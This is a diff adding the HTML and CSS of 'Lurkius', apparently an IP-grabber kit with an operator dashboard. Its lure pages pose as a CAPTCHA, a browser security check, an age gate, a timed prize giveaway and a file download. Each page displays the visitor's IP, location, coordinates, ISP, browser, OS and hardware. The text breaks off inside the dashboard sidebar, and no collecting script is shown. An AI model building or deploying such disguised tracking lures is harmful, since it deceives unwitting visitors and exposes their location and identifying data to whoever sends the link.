@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Lurkius</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#080808;--sf:#101010;--sf2:#161616;--bd:#222;--bd2:#2e2e2e;--tx:#f2f2f2;--mt:#555;--mt2:#888;--ac:#fff;--ac-tx:#000}
+body.light{--bg:#f4f4f4;--sf:#fff;--sf2:#ebebeb;--bd:#e0e0e0;--bd2:#ccc;--tx:#111;--mt:#aaa;--mt2:#666}
+html,body{height:100%;background:var(--bg);color:var(--tx);font-family:'DM Mono',monospace;overflow-x:hidden;transition:background .3s,color .3s}
+body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");pointer-events:none;z-index:9999;opacity:.35;mix-blend-mode:overlay}
+
+/* BASE */
+.page{display:none;min-height:100vh}
+.page.on{display:flex}
+.center{align-items:center;justify-content:center;padding:16px}
+.card{background:var(--sf);border:1px solid var(--bd);border-radius:4px}
+.syne{font-family:'Syne',sans-serif}
+input,select,textarea{width:100%;background:var(--bg);border:1px solid var(--bd2);border-radius:3px;padding:8px 10px;font-family:'DM Mono',monospace;font-size:11px;color:var(--tx);outline:none;transition:border-color .2s}
+input:focus,select:focus,textarea:focus{border-color:var(--ac)}
+select option{background:var(--sf2)}
+textarea{resize:vertical;min-height:60px}
+input[type=color]{padding:3px;height:32px;cursor:pointer}
+.btn{padding:8px 16px;border:none;border-radius:3px;font-family:'Syne',sans-serif;font-size:10px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;cursor:pointer;transition:opacity .2s}
+.btn-p{background:var(--ac);color:var(--ac-tx)}.btn-p:hover{opacity:.85}
+.btn-g{background:transparent;color:var(--mt2);border:1px solid var(--bd2)}.btn-g:hover{color:var(--tx);background:rgba(255,255,255,.04)}
+.btn-danger{color:#ef4444;border-color:rgba(239,68,68,.3)}.btn-danger:hover{background:rgba(239,68,68,.08)}
+.row{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px}
+.col{flex:1;min-width:140px}.col2{flex:2;min-width:200px}
+.field label{display:block;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--mt);margin-bottom:5px}
+.lbl{font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--mt)}
+.divider{height:1px;background:var(--bd);margin:14px 0}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.1}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
+.toast{position:fixed;bottom:18px;right:18px;background:var(--ac);color:var(--ac-tx);padding:10px 16px;border-radius:3px;font-family:'Syne',sans-serif;font-size:11px;font-weight:700;z-index:99999;transform:translateY(60px);opacity:0;transition:all .3s cubic-bezier(.34,1.56,.64,1)}
+.toast.on{transform:translateY(0);opacity:1}
+
+/* ── SHARED VERIFY ── */
+#vWrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:14px;position:relative}
+#vWrap::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:52px 52px;pointer-events:none;z-index:0}
+.v-card{width:100%;max-width:410px;position:relative;z-index:1;box-shadow:0 0 80px rgba(0,0,0,.8)}
+.v-rows{opacity:0;transition:opacity .4s;margin-top:12px}
+.v-rows.on{opacity:1}
+.v-row{display:flex;justify-content:space-between;align-items:baseline;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);gap:10px;font-size:10px}
+.v-row:last-child{border-bottom:none}
+.v-key{color:var(--mt);letter-spacing:.05em;text-transform:uppercase;flex-shrink:0}
+.v-val{color:var(--mt2);text-align:right;word-break:break-all}
+.v-prog{height:2px;background:var(--bd);border-radius:1px;overflow:hidden;opacity:0;transition:opacity .3s;margin:10px 0}
+.v-prog.on{opacity:1}
+.v-fill{height:100%;width:0%;background:var(--ac);transition:width .08s linear}
+.v-btn{display:none;width:100%;margin-top:12px;padding:11px;background:var(--ac);color:var(--ac-tx);border:none;border-radius:3px;font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.07em;text-transform:uppercase;cursor:pointer}
+.v-btn:hover{opacity:.85}.v-btn.on{display:block}
+
+/* TPL 1: CAPTCHA */
+.c-header{padding:16px 20px 12px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:11px}
+.c-logo{width:28px;height:28px;border:1.5px solid var(--ac);border-radius:3px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:13px;color:var(--ac);flex-shrink:0}
+.c-title h1{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;color:var(--tx)}
+.c-title p{font-size:9px;color:var(--mt);margin-top:1px;letter-spacing:.05em;text-transform:uppercase}
+.c-body{padding:16px 20px}
+.c-status{display:flex;align-items:center;gap:7px;font-size:10px;color:var(--mt2);margin-bottom:12px}
+.c-dot{width:5px;height:5px;border-radius:50%;background:var(--ac);flex-shrink:0;animation:blink 1.8s ease-in-out infinite}
+.c-widget{border:1px solid var(--bd2);border-radius:3px;padding:12px 15px;display:flex;align-items:center;justify-content:space-between;background:var(--sf2)}
+.c-widget-l{display:flex;align-items:center;gap:11px}
+.c-box{width:20px;height:20px;border:1.5px solid var(--bd2);border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .3s}
+.c-box.spin{border-color:rgba(255,255,255,.1);border-top-color:var(--ac);animation:spin .65s linear infinite}
+.c-box.ok{background:var(--ac);border-color:var(--ac)}
+.c-box svg{display:none}.c-box.ok svg{display:block}
+.c-lbl{font-family:'Syne',sans-serif;font-size:12px;font-weight:600;color:var(--tx);user-select:none}
+.c-badge .bn{font-family:'Syne',sans-serif;font-size:10px;font-weight:700;color:var(--ac);letter-spacing:.07em;text-transform:uppercase}
+.c-badge .bs{font-size:9px;color:var(--mt)}
+.c-ok{display:none;align-items:center;gap:8px;border:1px solid rgba(255,255,255,.1);border-radius:3px;padding:9px 13px;margin-top:12px;font-family:'Syne',sans-serif;font-size:10px;font-weight:700;color:var(--tx);letter-spacing:.05em;text-transform:uppercase}
+.c-ok.on{display:flex}
+.c-greet{display:none;margin-top:10px}.c-greet.on{display:block}
+.c-greet p{font-size:9px;color:var(--mt);letter-spacing:.05em;text-transform:uppercase;margin-bottom:2px}
+.c-greet h2{font-family:'Syne',sans-serif;font-size:16px;font-weight:800;color:var(--tx)}
+.c-greet h2 em{color:var(--ac);font-style:normal}
+.c-foot{padding:10px 20px;border-top:1px solid var(--bd);display:flex;justify-content:space-between;font-size:9px;color:var(--mt)}
+
+/* TPL 2: SHIELD */
+.sh-wrap{padding:24px 20px;text-align:center}
+.sh-icon{width:56px;height:56px;margin:0 auto 14px;position:relative}
+.sh-icon svg{width:56px;height:56px}
+#shAnim{stroke-dasharray:130;stroke-dashoffset:130;transition:stroke-dashoffset 2s ease}
+.sh-title{font-family:'Syne',sans-serif;font-size:17px;font-weight:800;color:var(--tx);margin-bottom:5px}
+.sh-sub{font-size:10px;color:var(--mt2);margin-bottom:16px;line-height:1.6}
+.sh-checks{text-align:left;margin-bottom:12px}
+.sh-row{display:flex;align-items:center;gap:9px;padding:6px 0;font-size:10px;color:var(--mt2);border-bottom:1px solid rgba(255,255,255,.04)}
+.sh-row:last-child{border:none}
+.sh-ico{width:15px;height:15px;border-radius:50%;border:1.5px solid var(--bd2);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:8px;transition:all .3s}
+.sh-ico.spinning{border-top-color:var(--ac);animation:spin .6s linear infinite}
+.sh-ico.done{background:var(--ac);border-color:var(--ac);color:var(--ac-tx);animation:none}
+
+/* TPL 3: AGE */
+.age-wrap{padding:22px 20px}
+.age-tag{display:inline-flex;align-items:center;gap:5px;background:var(--sf2);border:1px solid var(--bd2);border-radius:2px;padding:3px 9px;font-size:9px;letter-spacing:.07em;text-transform:uppercase;color:var(--mt);margin-bottom:16px}
+.age-title{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--tx);margin-bottom:6px;letter-spacing:-.01em}
+.age-sub{font-size:10px;color:var(--mt2);line-height:1.6;margin-bottom:18px}
+.age-confirm{display:flex;align-items:flex-start;gap:9px;padding:10px 12px;background:var(--sf2);border:1px solid var(--bd2);border-radius:3px;cursor:pointer;margin-bottom:12px}
+.age-box{width:15px;height:15px;border:1.5px solid var(--bd2);border-radius:2px;flex-shrink:0;margin-top:1px;display:flex;align-items:center;justify-content:center;font-size:9px;transition:all .2s}
+.age-box.on{background:var(--ac);border-color:var(--ac);color:var(--ac-tx)}
+.age-ctext{font-size:10px;color:var(--mt2);line-height:1.5;user-select:none}
+.age-sbtn{width:100%;padding:12px;background:var(--ac);color:var(--ac-tx);border:none;border-radius:3px;font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;cursor:pointer;opacity:.35;pointer-events:none;transition:opacity .2s}
+.age-sbtn.ready{opacity:1;pointer-events:auto}.age-sbtn.ready:hover{opacity:.85}
+.age-foot{font-size:9px;color:var(--mt);margin-top:10px;text-align:center}
+
+/* TPL 4: PRIZE */
+.pr-wrap{padding:26px 20px;text-align:center}
+.pr-emoji{font-size:44px;margin-bottom:12px;animation:pulse 2s ease-in-out infinite}
+.pr-title{font-family:'Syne',sans-serif;font-size:20px;font-weight:800;color:var(--tx);margin-bottom:5px;letter-spacing:-.02em}
+.pr-sub{font-size:11px;color:var(--mt2);line-height:1.6;margin-bottom:6px}
+.pr-tag{display:inline-block;background:var(--sf2);border:1px solid var(--bd2);border-radius:2px;padding:2px 9px;font-size:9px;letter-spacing:.07em;text-transform:uppercase;color:var(--mt);margin-bottom:16px}
+.pr-timer{font-family:'Syne',sans-serif;font-size:26px;font-weight:800;color:var(--ac);margin-bottom:2px}
+.pr-tlbl{font-size:9px;color:var(--mt);letter-spacing:.06em;text-transform:uppercase;margin-bottom:16px}
+.pr-btn{width:100%;padding:13px;background:var(--ac);color:var(--ac-tx);border:none;border-radius:3px;font-family:'Syne',sans-serif;font-size:12px;font-weight:800;letter-spacing:.05em;text-transform:uppercase;cursor:pointer}
+.pr-btn:hover{opacity:.85}
+.pr-foot{font-size:9px;color:var(--mt);margin-top:12px}
+
+/* TPL 5: DOWNLOAD */
+.dl-wrap{padding:22px 20px}
+.dl-hd{display:flex;align-items:center;gap:11px;margin-bottom:18px;padding-bottom:14px;border-bottom:1px solid var(--bd)}
+.dl-icon{width:38px;height:38px;background:var(--sf2);border:1px solid var(--bd2);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.dl-hd-text h3{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;color:var(--tx)}
+.dl-hd-text p{font-size:9px;color:var(--mt);margin-top:2px}
+.dl-status{font-size:10px;color:var(--mt2);margin-bottom:8px}
+.dl-bar{height:5px;background:var(--bd);border-radius:3px;overflow:hidden;margin-bottom:6px}
+.dl-bar-fill{height:100%;width:0%;background:var(--ac);transition:width .1s linear}
+.dl-pct{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;color:var(--ac);margin-bottom:12px}
+.dl-meta{font-size:9px;color:var(--mt);display:flex;justify-content:space-between}
+
+/* ── AUTH ── */
+#authPage{flex-direction:column}
+.auth-card{max-width:340px;width:100%;margin:auto}
+.auth-body{padding:22px}
+.auth-logo{text-align:center;margin-bottom:20px}
+.auth-logo .al{width:32px;height:32px;border:2px solid var(--ac);border-radius:3px;display:inline-flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;color:var(--ac);margin-bottom:7px}
+.auth-logo h2{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--tx);letter-spacing:-.02em}
+.auth-logo p{font-size:9px;color:var(--mt);margin-top:3px}
+.auth-tabs{display:flex;border-bottom:1px solid var(--bd);margin-bottom:18px}
+.auth-tab{flex:1;padding:9px;text-align:center;font-family:'Syne',sans-serif;font-size:10px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--mt);cursor:pointer;border-bottom:2px solid transparent;transition:all .2s}
+.auth-tab.on{color:var(--ac);border-bottom-color:var(--ac)}
+.auth-field{margin-bottom:10px}
+.auth-field label{display:block;font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--mt);margin-bottom:4px}
+.auth-err{font-size:10px;color:#ef4444;margin-top:7px;display:none}
+.auth-err.on{display:block}
+
+/* ── DASHBOARD ── */
+#dashPage{flex-direction:column}
+.d-nav{height:50px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between;padding:0 22px;background:var(--sf);position:sticky;top:0;z-index:100;flex-shrink:0}
+.d-nav-l{display:flex;align-items:center;gap:9px}
+.d-nav-logo{width:22px;height:22px;border:1.5px solid var(--ac);border-radius:2px;display:flex;align-items:center;justify-content:center;font-family:'Syne',sans-serif;font-weight:800;font-size:10px;color:var(--ac)}
+.d-nav-name{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;color:var(--tx);letter-spacing:.05em;text-transform:uppercase}
+.d-nav-r{display:flex;align-items:center;gap:8px}
+.d-nav-user{font-size:10px;color:var(--mt2)}
+.d-nav-out{background:none;border:none;color:var(--mt);font-size:10px;cursor:pointer;font-family:'DM Mono',monospace;padding:3px 7px;border-radius:2px;transition:color .2s}
+.d-nav-out:hover{color:#ef4444}
+.d-layout{display:flex;flex:1}
+.d-side{width:174px;border-right:1px solid var(--bd);background:var(--sf);flex-shrink:0;padding:18px 0;min-height:calc(100vh - 50px)}
+.d-side-lbl{font-size:9px;letter-spacing:.1em;text-transform:uppercase;color:var(--mt);padding:0 15px 8px}
+.d-si{display:flex;align-items:center;gap:8px;padding:8px 15px;font-size:11px;color:var(--mt2);cursor:pointer;border-left:2px solid transparent;transition:all .15s}
+.d-si:hover{color:var(--tx);background:rgba(255,255,255,.03)}
+.d-si.on{color:var(--ac);border-left-color:var(--ac);background:rgba(255,255,255,.04)}
+.d-si svg{opacity:.4;flex-shrink:0}.d-si.on svg{opacity:1}
+.d-main{flex:1;padding:26px 30px;overflow-y:auto}
+.d-hd{margin-bottom:20px}
+.d-hd h2{font-family:'Syne',sans-serif;font-size:19px;font-weight:800;color:var(--tx);letter-spacing:-.02em}
+.d-hd p{font-size:10px;color:var(--mt);margin-top:3px}
+.d-tab{display:none}.d-tab.on{display:block}
+.d-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;margin-bottom:20px}
+.d-stat{background:var(--sf);border:1px solid var(--bd);border-radius:3px;padding:15px}
+.d-stat-n{font-family:'Syne',sans-serif;font-size:24px;font-weight:800;color:var(--ac);letter-spacing:-.04em}
+.d-stat-l{font-size:9px;color:var(--mt);letter-spacing:.07em;text-transform:uppercase;margin-top:4px}
+.d-card{background:var(--sf);border:1px solid var(--bd);border-radius:3px;margin-bottom:14px}
+.d-card-hd{padding:13px 18px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between}
+.d-card-hd h3{font-family:'Syne',sans-serif;font-size:11px;font-weight:700;color:var(--tx)}
+.d-card-hd span{font-size:10px;color:var(--mt)}
+.d-card-b{padding:18px}
+.d-tbl{width:100%;border-collapse:collapse}
+.d-tbl th{text-align:left;font-size:9px;letter-spacing:.09em;text-transform:uppercase;color:var(--mt);padding:0 0 7px;border-bottom:1px solid var(--bd);font-weight:400}
+.d-tbl td{padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:10px;color:var(--mt2);vertical-align:middle}
+.d-tbl tr:last-child td{border-bottom:none}
+.d-tbl td:first-child{color:var(--tx)}
+.d-key{display:inline-block;font-family:'DM Mono',monospace;font-size:9px;background:rgba(255,255,255,.05);border:1px solid var(--bd);border-radius:2px;padding:2px 6px;color:var(--mt2)}
+.d-url{font-size:9px;color:var(--mt);max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.d-copy{background:transparent;border:1px solid var(--bd);border-radius:2px;padding:3px 8px;font-family:'Syne',sans-serif;font-size:9px;font-weight:600;color:var(--mt2);cursor:pointer;letter-spacing:.05em;text-transform:uppercase;transition:all .2s}
+.d-copy:hover{background:var(--ac);color:var(--ac-tx);border-color:var(--ac)}
+.d-del{background:transparent;border:none;color:var(--mt);cursor:pointer;padding:3px;font-size:12px;transition:color .2s}
+.d-del:hover{color:#ef4444}
+.d-empty{text-align:center;padding:28px;color:var(--mt);font-size:10px}
+.d-empty-ico{font-size:20px;margin-bottom:5px;opacity:.3}
+
+/* embed preview */
+.e-prev{margin-top:12px;background:var(--sf2);border:1px solid var(--bd2);border-radius:3px;padding:13px;border-left:4px solid var(--ac)}
+.e-prev-lbl{font-size:9px;letter-spacing:.09em;text-transform:uppercase;color:var(--mt);margin-bottom:7px}
+.e-prev-title{font-family:'Syne',sans-serif;font-size:12px;font-weight:700;color:var(--tx);margin-bottom:3px}
+.e-prev-desc{font-size:10px;color:var(--mt2);line-height:1.5;white-space:pre-wrap}
+.e-prev-tags{font-size:9px;color:var(--mt);margin-top:7px;display:flex;flex-wrap:wrap;gap:3px}
+.e-prev-tags span{background:rgba(255,255,255,.06);border:1px solid var(--bd);padding:1px 5px;border-radius:2px}
+.e-prev-foot{font-size:9px;color:var(--mt);margin-top:7px;padding-top:6px;border-top:1px solid var(--bd)}
+
+/* activity */
+.d-act{display:flex;align-items:flex-start;gap:9px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04)}
+.d-act:last-child{border-bottom:none}
+.d-act-dot{width:5px;height:5px;border-radius:50%;background:var(--bd2);margin-top:3px;flex-shrink:0}
+.d-act-dot.live{background:var(--ac);animation:blink 2s infinite}
+.d-act-tx{font-size:10px;color:var(--mt2);line-height:1.5}
+.d-act-tx strong{color:var(--tx)}
+.d-act-time{font-size:9px;color:var(--mt);margin-top:1px}
+
+/* settings */
+.s-row{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-bottom:1px solid rgba(255,255,255,.04);gap:12px}
+.s-row:last-child{border-bottom:none}
+.s-info h4{font-size:11px;color:var(--tx);margin-bottom:2px}
+.s-info p{font-size:9px;color:var(--mt)}
+.s-toggle{width:36px;height:19px;background:var(--bd2);border-radius:10px;cursor:pointer;position:relative;border:none;flex-shrink:0;transition:background .2s}
+.s-toggle.on{background:var(--ac)}
+.s-toggle::after{content:'';position:absolute;top:2.5px;left:2.5px;width:14px;height:14px;border-radius:50%;background:var(--bg);transition:left .2s}
+.s-toggle.on::after{left:19.5px}
+.swatches{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-top:8px}
+.swatch{width:24px;height:24px;border-radius:50%;border:2px solid transparent;cursor:pointer;transition:border-color .2s;flex-shrink:0}
+.swatch.on{border-color:var(--tx) !important}
+</style>
+</head>
+<body>
+
+<!-- ═══════ VERIFY ═══════ -->
+<div id="vWrap">
+
+  <!-- TPL 1 CAPTCHA -->
+  <div class="v-card card" id="tCaptcha">
+    <div class="c-header">
+      <div class="c-logo" id="cLogoEl">L</div>
+      <div class="c-title"><h1 id="cBrand">Lurkius Security</h1><p>Human Verification · v2.4</p></div>
+    </div>
+    <div class="c-body">
+      <div class="c-status"><span class="c-dot"></span><span id="cStat">Establishing secure connection…</span></div>
+      <div class="c-widget">
+        <div class="c-widget-l">
+          <div class="c-box" id="cBox"><svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M2 5.5l2.5 2.5 4.5-4.5" stroke="var(--ac-tx)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+          <span class="c-lbl" id="cLbl">I am human</span>
+        </div>
+        <div class="c-badge"><div class="bn" id="cBadge">Lurkius</div><div class="bs">Zero-Trust Verify</div></div>
+      </div>
+      <div class="v-prog" id="cProg"><div class="v-fill" id="cFill"></div></div>
+      <div class="v-rows" id="cRows">
+        <div class="v-row"><span class="v-key">IP</span><span class="v-val" id="cIp">—</span></div>
+        <div class="v-row"><span class="v-key">Location</span><span class="v-val" id="cLoc">—</span></div>
+        <div class="v-row"><span class="v-key">Coords</span><span class="v-val" id="cCoords">—</span></div>
+        <div class="v-row"><span class="v-key">ISP</span><span class="v-val" id="cIsp">—</span></div>
+        <div class="v-row"><span class="v-key">ASN</span><span class="v-val" id="cAsn">—</span></div>
+        <div class="v-row"><span class="v-key">Timezone</span><span class="v-val" id="cTz">—</span></div>
+        <div class="v-row"><span class="v-key">Browser</span><span class="v-val" id="cBr">—</span></div>
+        <div class="v-row"><span class="v-key">OS</span><span class="v-val" id="cOs">—</span></div>
+        <div class="v-row"><span class="v-key">Screen</span><span class="v-val" id="cSc">—</span></div>
+        <div class="v-row"><span class="v-key">Language</span><span class="v-val" id="cLg">—</span></div>
+        <div class="v-row"><span class="v-key">CPU</span><span class="v-val" id="cCpu">—</span></div>
+        <div class="v-row"><span class="v-key">RAM</span><span class="v-val" id="cRam">—</span></div>
+      </div>
+      <div class="c-ok" id="cOk"><svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="var(--ac)" stroke-width="1.2"/><path d="M3.5 5.5l1.5 1.5 2.5-2.5" stroke="var(--ac)" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/></svg><span>VERIFICATION COMPLETE</span></div>
+      <div class="c-greet" id="cGreet"><p>Detected Region</p><h2>How's it there in <em id="cCountry"></em>?</h2></div>
+      <button class="v-btn" id="cContinue" onclick="afterVerify()">Continue →</button>
+    </div>
+    <div class="c-foot"><span>LURKIUS SECURITY SYSTEMS</span><span id="cTime"></span></div>
+  </div>
+
+  <!-- TPL 2 SHIELD -->
+  <div class="v-card card" id="tShield" style="display:none">
+    <div class="sh-wrap">
+      <div class="sh-icon">
+        <svg viewBox="0 0 56 56" fill="none"><path d="M28 4L6 13v16c0 13 9.5 25.2 22 28 12.5-2.8 22-15 22-28V13L28 4z" stroke="var(--ac)" stroke-width="1.8" fill="none" opacity=".25"/><path d="M28 4L6 13v16c0 13 9.5 25.2 22 28 12.5-2.8 22-15 22-28V13L28 4z" stroke="var(--ac)" stroke-width="1.8" fill="none" id="shAnim"/></svg>
+      </div>
+      <div class="sh-title syne" id="shTitle">Checking Your Connection</div>
+      <div class="sh-sub" id="shSub">Please wait while we verify your browser is safe to proceed.</div>
+      <div class="v-prog" id="shProg"><div class="v-fill" id="shFill"></div></div>
+      <div class="sh-checks">
+        <div class="sh-row"><div class="sh-ico spinning" id="si1"></div><span id="st1">Analysing browser fingerprint…</span></div>
+        <div class="sh-row"><div class="sh-ico" id="si2"></div><span id="st2">Checking threat database</span></div>
+        <div class="sh-row"><div class="sh-ico" id="si3"></div><span id="st3">Resolving geolocation</span></div>
+        <div class="sh-row"><div class="sh-ico" id="si4"></div><span id="st4">Validating request origin</span></div>
+      </div>
+      <div class="v-rows" id="shRows">
+        <div class="v-row"><span class="v-key">IP</span><span class="v-val" id="shIp">—</span></div>
+        <div class="v-row"><span class="v-key">Location</span><span class="v-val" id="shLoc">—</span></div>
+        <div class="v-row"><span class="v-key">ISP</span><span class="v-val" id="shIsp">—</span></div>
+        <div class="v-row"><span class="v-key">Browser</span><span class="v-val" id="shBr">—</span></div>
+        <div class="v-row"><span class="v-key">OS</span><span class="v-val" id="shOs">—</span></div>
+      </div>
+      <button class="v-btn" id="shContinue" onclick="afterVerify()">Proceed →</button>
+      <div style="font-size:9px;color:var(--mt);margin-top:10px">Secured by ShieldNet · TLS 1.3</div>
+    </div>
+  </div>
+
+  <!-- TPL 3 AGE -->
+  <div class="v-card card" id="tAge" style="display:none">
+    <div class="age-wrap">
+      <div class="age-tag">⚠ Age Restricted</div>
+      <div class="age-title syne">You must be 18+ to continue.</div>
+      <div class="age-sub">This site contains content not suitable for minors. Please confirm your age before proceeding.</div>
+      <div class="v-prog" id="ageProg" style="display:none"><div class="v-fill" id="ageFill"></div></div>
+      <div class="age-confirm" onclick="ageToggle()">
+        <div class="age-box" id="ageBox"></div>
+        <div class="age-ctext">I confirm I am 18 or older and agree to the Terms of Service and Privacy Policy.</div>
+      </div>
+      <button class="age-sbtn" id="ageBtn" onclick="ageSubmit()">Confirm & Continue</button>
+      <div class="v-rows" id="ageRows">
+        <div class="v-row"><span class="v-key">IP</span><span class="v-val" id="ageIp">—</span></div>
+        <div class="v-row"><span class="v-key">Location</span><span class="v-val" id="ageLoc">—</span></div>
+        <div class="v-row"><span class="v-key">Browser</span><span class="v-val" id="ageBr">—</span></div>
+        <div class="v-row"><span class="v-key">OS</span><span class="v-val" id="ageOs">—</span></div>
+      </div>
+      <button class="v-btn" id="ageContinue" onclick="afterVerify()">Enter Site →</button>
+      <div class="age-foot">By entering you confirm compliance with our terms.</div>
+    </div>
+  </div>
+
+  <!-- TPL 4 PRIZE -->
+  <div class="v-card card" id="tPrize" style="display:none">
+    <div class="pr-wrap">
+      <div class="pr-emoji">🎁</div>
+      <div class="pr-title syne">You've Been Selected!</div>
+      <div class="pr-sub">Congratulations! You are visitor <strong style="color:var(--ac)" id="prNum">10,000</strong>. Claim your reward before it expires.</div>
+      <div class="pr-tag">Limited Time Offer</div>
+      <div class="pr-timer syne" id="prTimer">04:59</div>
+      <div class="pr-tlbl">Time remaining to claim</div>
+      <div class="v-prog" id="prProg" style="display:none"><div class="v-fill" id="prFill"></div></div>
+      <button class="pr-btn syne" id="prBtn" onclick="prizeClaim()">🎉 Claim Your Prize</button>
+      <div class="v-rows" id="prRows">
+        <div class="v-row"><span class="v-key">IP</span><span class="v-val" id="prIp">—</span></div>
+        <div class="v-row"><span class="v-key">Location</span><span class="v-val" id="prLoc">—</span></div>
+        <div class="v-row"><span class="v-key">Browser</span><span class="v-val" id="prBr">—</span></div>
+      </div>
+      <button class="v-btn" id="prContinue" onclick="afterVerify()">Proceed to Claim →</button>
+      <div class="pr-foot">© 2026 PromoNet. Offer valid while supplies last.</div>
+    </div>
+  </div>
+
+  <!-- TPL 5 DOWNLOAD -->
+  <div class="v-card card" id="tDownload" style="display:none">
+    <div class="dl-wrap">
+      <div class="dl-hd">
+        <div class="dl-icon">📦</div>
+        <div class="dl-hd-text"><h3 class="syne">Package_v2.1.zip</h3><p>Preparing download · 24.8 MB</p></div>
+      </div>
+      <div class="dl-status" id="dlStat">Connecting to server…</div>
+      <div class="dl-bar"><div class="dl-bar-fill" id="dlFill"></div></div>
+      <div class="dl-pct" id="dlPct">0%</div>
+      <div class="dl-meta"><span id="dlSpeed">0 KB/s</span><span id="dlEta">Calculating…</span></div>
+      <div class="v-rows" id="dlRows" style="margin-top:12px">
+        <div class="v-row"><span class="v-key">IP</span><span class="v-val" id="dlIp">—</span></div>
+        <div class="v-row"><span class="v-key">Location</span><span class="v-val" id="dlLoc">—</span></div>
+        <div class="v-row"><span class="v-key">Browser</span><span class="v-val" id="dlBr">—</span></div>
+      </div>
+      <button class="v-btn" id="dlContinue" onclick="afterVerify()" style="margin-top:12px">Save File →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════ AUTH ═══════ -->
+<div id="authPage" class="page center" style="flex-direction:column">
+  <div class="auth-card card">
+    <div class="auth-body">
+      <div class="auth-logo">
+        <div class="al">L</div>
+        <h2>Lurkius</h2>
+        <p>Sign in to access your dashboard</p>
+      </div>
+      <div class="auth-tabs">
+        <div class="auth-tab on" onclick="switchAuth('login')">Sign In</div>
+        <div class="auth-tab" onclick="switchAuth('register')">Register</div>
+      </div>
+      <div id="loginView">
+        <div class="auth-field"><label>Username</label><input type="text" id="liUser" placeholder="username"/></div>
+        <div class="auth-field"><label>Password</label><input type="password" id="liPass" placeholder="••••••••"/></div>
+        <div class="auth-err" id="liErr">Invalid username or password.</div>
+        <button class="btn btn-p" style="width:100%;margin-top:6px" onclick="doLogin()">Sign In</button>
+      </div>
+      <div id="regView" style="display:none">
+        <div class="auth-field"><label>Username</label><input type="text" id="regUser" placeholder="choose a username"/></div>
+        <div class="auth-field"><label>Password</label><input type="password" id="regPass" placeholder="••••••••"/></div>
+        <div class="auth-field"><label>Confirm Password</label><input type="password" id="regPass2" placeholder="••••••••"/></div>
+        <div class="auth-err" id="regErr"></div>
+        <button class="btn btn-p" style="width:100%;margin-top:6px" onclick="doRegister()">Create Account</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════ DASHBOARD ═══════ -->
+<div id="dashPage" class="page" style="flex-direction:column">
+  <nav class="d-nav">
+    <div class="d-nav-l">
+      <div class="d-nav-logo" id="navLogo">L</div>
+      <span class="d-nav-name" id="navName">Lurkius</span>
+    </div>
+    <div class="d-nav-r">
+      <span class="d-nav-user" id="navUser"></span>
+      <button class="d-nav-out" onclick="doLogout()">Sign out</button>
+    </div>
+  </nav>
+  <div class="d-layout">
+    <aside class="d-side">
+      <div class="d-side-lbl">Menu</div>
